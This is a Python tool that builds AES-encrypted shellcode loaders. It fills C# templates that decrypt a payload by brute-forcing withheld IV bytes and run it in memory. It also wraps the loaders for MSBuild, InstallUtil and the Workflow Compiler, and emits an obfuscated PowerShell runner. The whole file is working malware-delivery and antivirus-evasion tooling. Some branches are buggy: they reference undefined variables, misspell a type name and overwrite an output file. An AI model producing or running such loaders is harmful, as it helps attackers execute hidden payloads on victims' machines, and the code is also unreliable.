import hashlib, os, sys, argparse, string, random
from base64 import encode                                                                                                                                                                                                                                                                                                                                                                            
from Crypto.Cipher import AES                                                                                                                                                                                                                                                                                                                                                                        
from Crypto.Util.Padding import pad                                                                                                                                                                                                                                                                                                                                                                  
from Crypto.Random import get_random_bytes


TEMPLATECS = """
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;
namespace ze
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct SECT_DATA
        {
            public Boolean isvalid;
            public IntPtr hSection;
            public IntPtr pBase;
        }
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(
            ref IntPtr section,
            UInt32 desiredAccess,
            IntPtr pAttrs,
            ref long MaxSize,
            uint pageProt,
            uint allocationAttribs,
            IntPtr hFile);
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);
        public static SECT_DATA MapLocalSectionAndWrite(byte[] ShellCode)
        {
            SECT_DATA SectData = new SECT_DATA();
            long ScSize = ShellCode.Length;
            long MaxSize = ScSize;
            IntPtr hSection = IntPtr.Zero;
            UInt32 CallResult = NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref MaxSize, 0x40, 0x8000000, IntPtr.Zero);
            if (CallResult == 0 && hSection != IntPtr.Zero)
            {
                SectData.hSection = hSection;
            }
            else
            {
                SectData.isvalid = false;
                return SectData;
            }
            IntPtr pScBase = IntPtr.Zero;
            long lSecOffset = 0;
            CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x4);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                SectData.pBase = pScBase;
            }
            else
            {
                SectData.isvalid = false;
                return SectData;
            }
            Marshal.Copy(ShellCode, 0, SectData.pBase, ShellCode.Length);
            IntPtr pScBase2 = IntPtr.Zero;
            CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase2, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x20);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                SectData.pBase = pScBase2;
            }
            else
            {
                SectData.isvalid = false;
                return SectData;
            }
            SectData.isvalid = true;
            return SectData;
        }

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        private delegate Int32 Initialize();
        public static byte[] DecryptAES(byte[] buffer, byte[] key, byte[] iv, byte[] OGhash, int origLen)
        {
            if (buffer == null || buffer.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (key == null || key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (iv == null || key.Length <= 0)
                throw new ArgumentNullException("IV");
            byte[] test = new byte[origLen];
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(buffer))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        csDecrypt.Read(test, 0, origLen);
                        HashAlgorithm sha = SHA256.Create();
                        byte[] result = sha.ComputeHash(test, 0, origLen);
                        bool bEqual = false;
                        if (result.Length == OGhash.Length)
                        {
                            int i = 0;
                            while ((i < result.Length) && (result[i] == OGhash[i]))
                            {
                                i += 1;
                            }
                            if (i == result.Length)
                            {
                                bEqual = true;
                            }
                        }
                        if (bEqual)
                            return test;
                        else
                            return null;
                    }
                }
            }
        }
        static void Runner(byte[] data)
        {
            byte[] key = { %s };
            byte[] iv = { %s };
            
            byte[] OG_hash = {
               %s
            };
            for (byte i = 0x01; i < 0xff; i++)
            {
                iv[14] = i;
                for (byte j = 1; j < 0xff; j++)
                {
                    iv[15] = j;
                    if (DecryptAES(data, key, iv, OG_hash, %s) != null) // OG len and encrypted len are different
                    {
                        byte[] shellcode = DecryptAES(data, key, iv, OG_hash, %s);
                        SECT_DATA LocalSect = MapLocalSectionAndWrite(shellcode);
                        if (!LocalSect.isvalid)
                        {
                            return;
                        }
                        Initialize del = (Initialize)Marshal.GetDelegateForFunctionPointer(LocalSect.pBase, typeof(Initialize));
                        del();

                        return;
                    }
                }
            }
        }
        public static void Main(string[] args)
        {
            byte[] buf = new byte[%s] { 
                %s 
            };
            Runner(buf);
        }
    }
}
"""

TEMPLATE_WC = """
using System;

namespace AB_netRunner
{
    using System.Workflow.ComponentModel;
    using System.Runtime.InteropServices;
    using System.Security.Cryptography;
    using System.IO;
    public class Run : Activity
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        public static byte[] DecryptAES(byte[] buffer, byte[] key, byte[] iv, byte[] OGhash, int origLen)
        {
            // Check arguments.
            if (buffer == null || buffer.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (key == null || key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (iv == null || key.Length <= 0)
                throw new ArgumentNullException("IV");
            byte[] test = new byte[origLen];
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(buffer))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {

                        csDecrypt.Read(test, 0, origLen);
                        HashAlgorithm sha = SHA256.Create();
                        byte[] result = sha.ComputeHash(test, 0, origLen);
                        bool bEqual = false;
                        if (result.Length == OGhash.Length)
                        {
                            int i = 0;
                            while ((i < result.Length) && (result[i] == OGhash[i]))
                            {
                                i += 1;
                            }
                            if (i == result.Length)
                            {
                                bEqual = true;
                            }
                        }
                        if (bEqual)
                            return test;
                        else
                            return null;
                    }
                }
            }
        }

        public Run()
        {
            Console.WriteLine("[+] running from Run!");
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            { return; }
            // keys to decrypt
            byte[] iv = { %s };
            byte[] key = { %s };
            byte[] OG_hash = {
                %s
            };
            
            byte[] buf = new byte[%s] {
                %s
            };

            for (byte i = 0x01; i < 0xff; i++)
            {
                iv[14] = i;
                for (byte j = 1; j < 0xff; j++)
                {
                    iv[15] = j;
                    if (DecryptAES(buf, key, iv, OG_hash, %s) != null) // OG len and encrypted len are different
                    {
                        byte[] shellcode = DecryptAES(buf, key, iv, OG_hash, %s);
                        int size = shellcode.Length;
                        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
                        Marshal.Copy(shellcode, 0, addr, size);
                        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                        WaitForSingleObject(hThread, 0xFFFFFFFF);
                        return;
                    }
                    else
                    {
                        Console.WriteLine("[!] Decryption Failed");
                    }
                }
            }
            return;
        }
    }
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("[+] running from Main!");
        }
    }
}
"""

TEMPLATE_RUNXML = """
<?xml version="1.0" encoding="utf-8"?>
<CompilerInput xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler">
  <files xmlns:d2p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
    <d2p1:string>%s</d2p1:string>
  </files>
  <parameters xmlns:d2p1="http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler">
    <assemblyNames xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <compilerOptions i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <coreAssemblyFileName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"></coreAssemblyFileName>
    <embeddedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <evidence xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Security.Policy" i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <generateExecutable xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</generateExecutable>
    <generateInMemory xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">true</generateInMemory>
    <includeDebugInformation xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</includeDebugInformation>
    <linkedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <mainClass i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <outputName i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <tempFiles i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <treatWarningsAsErrors xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</treatWarningsAsErrors>
    <warningLevel xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">-1</warningLevel>
    <win32Resource i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <d2p1:checkTypes>false</d2p1:checkTypes>
    <d2p1:compileWithNoCode>false</d2p1:compileWithNoCode>
    <d2p1:compilerOptions i:nil="true" />
    <d2p1:generateCCU>false</d2p1:generateCCU>
    <d2p1:languageToUse>CSharp</d2p1:languageToUse>
    <d2p1:libraryPaths xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" i:nil="true" />
    <d2p1:localAssembly xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Reflection" i:nil="true" />
    <d2p1:mtInfo i:nil="true" />
    <d2p1:userCodeCCUs xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.CodeDom" i:nil="true" />
  </parameters>
</CompilerInput>
"""

TEMPLATE_MSB = """
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="0xtaco">
    <Brax />
  </Target>
  <UsingTask
    TaskName="Brax"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
namespace ze
{
    public class Brax : Task, ITask
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct SECT_DATA
        {
            public Boolean isvalid;
            public IntPtr hSection;
            public IntPtr pBase;
        }
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(
            ref IntPtr section,
            UInt32 desiredAccess,
            IntPtr pAttrs,
            ref long MaxSize,
            uint pageProt,
            uint allocationAttribs,
            IntPtr hFile);
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);
        public static SECT_DATA MapLocalSectionAndWrite(byte[] ShellCode)
        {
            SECT_DATA SectData = new SECT_DATA();
            long ScSize = ShellCode.Length;
            long MaxSize = ScSize;
            IntPtr hSection = IntPtr.Zero;
            UInt32 CallResult = NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref MaxSize, 0x40, 0x8000000, IntPtr.Zero);
            if (CallResult == 0 && hSection != IntPtr.Zero)
            {
                SectData.hSection = hSection;
            }
            else
            { 
                SectData.isvalid = false;
                return SectData;
            }
            IntPtr pScBase = IntPtr.Zero;
            long lSecOffset = 0;
            CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x4);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            { 
                SectData.pBase = pScBase;
            }
            else
            { 
                SectData.isvalid = false;
                return SectData;
            }
            Marshal.Copy(ShellCode, 0, SectData.pBase, ShellCode.Length);
            IntPtr pScBase2 = IntPtr.Zero;
            CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase2, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x20);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                SectData.pBase = pScBase2;
            }
            else
            {
                SectData.isvalid = false;
                return SectData;
            }
            SectData.isvalid = true;
            return SectData;
        }

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        private delegate Int32 Initialize();
        public static byte[] DecryptAES(byte[] buffer, byte[] key, byte[] iv, byte[] OGhash, int origLen)
        {
            if (buffer == null || buffer.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (key == null || key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (iv == null || key.Length <= 0)
                throw new ArgumentNullException("IV");
            byte[] test = new byte[origLen];
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(buffer))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        csDecrypt.Read(test, 0, origLen);
                        HashAlgorithm sha = SHA256.Create();
                        byte[] result = sha.ComputeHash(test, 0, origLen);
                        bool bEqual = false;
                        if (result.Length == OGhash.Length)
                        {
                            int i = 0;
                            while ((i < result.Length) && (result[i] == OGhash[i]))
                            {
                                i += 1;
                            }
                            if (i == result.Length)
                            {
                                bEqual = true;
                            }
                        }
                        if (bEqual)
                            return test;
                        else
                            return null;
                    }
                }
            }
        }
        static void Runner(byte[] data)
        {
            byte[] iv = { %s};
            byte[] key = { %s };
            byte[] OG_hash = {
               %s
            };
            for (byte i = 0x01; i < 0xff; i++)
            {
                iv[14] = i;
                for (byte j = 1; j < 0xff; j++)
                {
                    iv[15] = j;
                    if (DecryptAES(data, key, iv, OG_hash, %s) != null)
                    {
                        byte[] shellcode = DecryptAES(data, key, iv, OG_hash, %s);
                        SECT_DATA LocalSect = MapLocalSectionAndWrite(shellcode);
                        if (!LocalSect.isvalid)
                        {
                            return;
                        }
                        Initialize del = (Initialize)Marshal.GetDelegateForFunctionPointer(LocalSect.pBase, typeof(Initialize));
                        del();
                        return;
                    }
                }
            }
        }
        public override bool Execute()
        {
            byte[] buf = new byte[%s] {
                %s
            };
            Runner(buf);
            return true;
        }
    }
}
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
"""

TEMPLATE_IU = """
using System;
using System.Collections.ObjectModel;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;

namespace CLMBypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtil : System.Configuration.Install.Installer
    {
		[StructLayout(LayoutKind.Sequential)]
        public struct SECT_DATA
        {
            public Boolean isvalid;
            public IntPtr hSection;
            public IntPtr pBase;
        }

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(
            ref IntPtr section,
            UInt32 desiredAccess,
            IntPtr pAttrs,
            ref long MaxSize,
            uint pageProt,
            uint allocationAttribs,
            IntPtr hFile);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        public static SECT_DATA MapLocalSectionAndWrite(byte[] ShellCode)
        {
            SECT_DATA SectData = new SECT_DATA();
            long ScSize = ShellCode.Length;
            long MaxSize = ScSize;
            IntPtr hSection = IntPtr.Zero;
            UInt32 CallResult = NtCreateSection(ref hSection, 0xe, IntPtr.Zero, ref MaxSize, 0x40, 0x8000000, IntPtr.Zero);
            if (CallResult == 0 && hSection != IntPtr.Zero)
            {
                
                SectData.hSection = hSection;
            }
            else
            {
                
                SectData.isvalid = false;
                return SectData;
            }

            // Allocate RW portion + Copy ShellCode
            IntPtr pScBase = IntPtr.Zero;
            long lSecOffset = 0;
            CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x4);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                
                SectData.pBase = pScBase;
            }
            else
            {
                Console.WriteLine("[!] Failed to map section locally..");
                SectData.isvalid = false;
                return SectData;
            }
            Marshal.Copy(ShellCode, 0, SectData.pBase, ShellCode.Length);

            // Allocate ER portion
            IntPtr pScBase2 = IntPtr.Zero;
            CallResult = NtMapViewOfSection(hSection, (IntPtr)(-1), ref pScBase2, IntPtr.Zero, IntPtr.Zero, ref lSecOffset, ref MaxSize, 0x2, 0, 0x20);
            if (CallResult == 0 && pScBase != IntPtr.Zero)
            {
                
                SectData.pBase = pScBase2;
            }
            else
            {
                Console.WriteLine("[!] Failed to map section locally..");
                SectData.isvalid = false;
                return SectData;
            }

            SectData.isvalid = true;
            return SectData;
        }

        [UnmanagedFunctionPointerAttribute(CallingConvention.Cdecl)]
        private delegate Int32 Initialize();

        public static byte[] DecryptAES(byte[] buffer, byte[] key, byte[] iv, byte[] OGhash, int origLen)
        {
            // Check arguments.
            if (buffer == null || buffer.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (key == null || key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (iv == null || key.Length <= 0)
                throw new ArgumentNullException("IV");
            byte[] test = new byte[origLen];
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(buffer))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {

                        csDecrypt.Read(test, 0, origLen);
                        HashAlgorithm sha = SHA256.Create();
                        byte[] result = sha.ComputeHash(test, 0, origLen);
                        bool bEqual = false;
                        if (result.Length == OGhash.Length)
                        {
                            int i = 0;
                            while ((i < result.Length) && (result[i] == OGhash[i]))
                            {
                                i += 1;
                            }
                            if (i == result.Length)
                            {
                                bEqual = true;
                            }
                        }
                        if (bEqual)
                            return test;
                        else
                            return null;
                    }
                }
            }
        }
		
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            byte[] buf = new byte[%s] {
                %s
            };
			
			byte[] iv = { %s };
            byte[] key = { %s };
            byte[] OG_hash = {
               %s
            };
            for (byte i = 0x01; i < 0xff; i++)
            {
                iv[14] = i;
                for (byte j = 1; j < 0xff; j++)
                {
                    iv[15] = j;
                    if (DecryptAES(data, key, iv, OG_hash, %s) != null) // OG len and encrypted len are different
                    {
                        Console.WriteLine("[*] Decryption Succeeded");
                        byte[] shellcode = DecryptAES(data, key, iv, OG_hash, %s);
                        
                        SECT_DATA LocalSect = MapLocalSectionAndWrite(shellcode);
                        if (!LocalSect.isvalid)
                        {
                            return;
                        }

                        
                        Initialize del = (Initialize)Marshal.GetDelegateForFunctionPointer(LocalSect.pBase, typeof(Initialize));
                        del();

                        return;
                    }
                    else
                    {
                        Console.WriteLine("[!] Decryption Failed");
                    }
                }
            }
        }
    }
}

"""

PS_TEMPLATE = """
function %s {
    Param ($%s, $%s)
    $%s = ([AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $%s=@()
    $%s.GetMethods() | %% {If($_.Name -eq "GetProcAddress") {$%s+=$_}}
    return $%s[0].Invoke($null, @(($%s.GetMethod('GetModuleHandle')).Invoke($null, @($%s)), $%s))
}

function %s {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $%s,
        [Parameter(Position = 1)] [Type] $%s = [Void]
    )
    $%s = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
    $%s.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $%s).SetImplementationFlags('Runtime, Managed')
    $%s.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $%s, $%s).SetImplementationFlags('Runtime, Managed')
    return $%s.CreateType()
}
$%s = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%s kernel32.dll VirtualAlloc), (%s @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
[Byte[]] $%s = %s 
[System.Runtime.InteropServices.Marshal]::Copy($%s, 0, $%s, $%s.length)

$%s = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%s kernel32.dll CreateThread), (%s @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$%s,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%s kernel32.dll WaitForSingleObject), (%s @([IntPtr], [Int32])([Int]))).Invoke($%s, 0xFFFFFFFF)

"""
# dumbest possible way to do this params
letters = string.ascii_letters
lookupfunc = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
modulename = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
functionanme = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
getdeltype = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
funcvar = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
deltypevar = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
typevar = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
assem = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
tmpvar = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
lpmem= ''.join(random.choice(letters) for i in range(random.randint(10,22)))
bufvar = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
hthread = ''.join(random.choice(letters) for i in range(random.randint(10,22)))


def format_shellcode(shellcode):                                                                                                                                                                                                                                                                                                                                                                     
    hshellcode = ""
    code_size = len(shellcode)                                                                                                                                                                                                                                                                                                                                                                       
    for num, byte in enumerate(shellcode):                                                                                                                                                                                                                                                                                                                                                           
        if num != code_size - 1: 
            hshellcode += f"{hex(byte)},"
        else: 
            hshellcode += f"{hex(byte)}"
    return hshellcode

def pretty_format_shellcode(shellcode):                                                                                                                                                                                                                                                                                                                                                                     
    hshellcode = ""                                                                                                                                                                                                                                                                                                                                                                                  
    code_size = len(shellcode)
    for num, byte in enumerate(shellcode):
        if num != 0 and num%49 == 0: hshellcode += f"\n\t\t\t\t{hex(byte)}," ;continue # rows of 50
        if num>0: 
            if num == code_size-1: hshellcode += f"{hex(byte)}"; continue
            hshellcode += f"{hex(byte)},"                                                                                                                                                                                                                                                                                                                                                            
        if num == 0:                                                                                                                                                                                                                                                                                                                                                                                        
            hshellcode += f"{hex(byte)}," 
    return hshellcode

verbose = False
pretty = False
parser = argparse.ArgumentParser(description="generate .NET executable to run AES-CBC encrypted shellcode.")
parser.add_argument('-inbin', type=str, help=".bin file")
parser.add_argument('--arch', type=str, choices=['x86', 'x64'], default="x64")
parser.add_argument('--outfile', type=str, default="out.exe")
parser.add_argument('--type', type=str, choices=['exe', 'workflowcompiler', 'msbuild', 'installutil', 'ps_template'], default="exe")
parser.add_argument('--verbose', default=False, action='store_true', dest='verbose')
parser.add_argument('--pretty', default=False, action='store_true', dest='pretty')
args = parser.parse_args()
input_filename = args.inbin

if args.type == "ps_template":
    with open(input_filename, "rb") as file: plain_data = file.read()
    p_shc = format_shellcode(plain_data)
    run_txt = PS_TEMPLATE % (
        lookupfunc, 
        modulename, functionanme, 
        assem,
        tmpvar,
        assem, tmpvar, 
        tmpvar, assem, modulename, functionanme, 
        getdeltype, 
        funcvar, 
        deltypevar, 
        typevar, 
        typevar, funcvar, 
        typevar, deltypevar, funcvar, 
        typevar, 
        lpmem, lookupfunc, getdeltype, 
        bufvar, p_shc, 
        bufvar, lpmem, bufvar, 
        hthread, lookupfunc, getdeltype, lpmem, 
        lookupfunc, getdeltype, hthread)
    if args.verbose:
        print(run_txt)
    with open("run.txt", "w") as f_run: f_run.write(run_txt)
    exit(0)

with open(input_filename, "rb") as file: data = file.read()
# encrypt payload
key = get_random_bytes(16)
iv = get_random_bytes(16)
cipher = AES.new(key=key, mode=AES.MODE_CBC, iv=iv, )
encrypted_data = cipher.encrypt(pad(data, AES.block_size))

m = hashlib.sha256()
m.update(data)

payload_hash = format_shellcode(m.digest())
og_data_len = len(data)
hex_iv = format_shellcode(iv)
hex_k = format_shellcode(key)
if args.pretty: e_shc = pretty_format_shellcode(encrypted_data)
else: e_shc = format_shellcode(encrypted_data)
enc_data_len = len(encrypted_data)

if args.type == "exe":
    program_cs = TEMPLATECS % (hex_k, hex_iv, payload_hash, og_data_len, og_data_len, enc_data_len, e_shc)
    if args.verbose:
        print(program_cs)
    with open("Program.cs", "w") as out_file: out_file.write(program_cs)
    os.system(f"mono-csc -platform:{args.arch} -out:{args.outfile} -unsafe Program.cs")
if args.type == "workflowcompiler":
    program_cs = TEMPLATE_WC % (hex_iv, hex_k, payload_hash, enc_data_len, e_shc, og_data_len, og_data_len)
    run_xml = TEMPLATE_RUNXML % f"C:\\users\\public\\brax.txt"
    if args.verbose:
        print(program_cs)
        print(run_xml)
    with open("brax.txt", "w") as out_file: out_file.write(program_cs)
    with open("brax.txt", "w") as out_file: out_file.write(run_xml)
if args.type == "msbuild":
    program_cs = TEMPLATE_MSB % (hex_iv, hex_k, payload_hash, og_data_len, og_data_len, enc_data_len, e_shc)
    if args.verbose:
        print(program_cs)
    with open("Program.cs", "w") as out_file: out_file.write(program_cs)
if args.type == "instalutil":
    program_cs = TEMPLATE_IU % (enc_data_len, e_shc, hex_iv, hex_k, payload_hash, og_data_len, og_data_len)
    if args.verbose:
        print(program_cs)
    with open("Program.cs", "w") as out_file: outfile.write(program_cs)
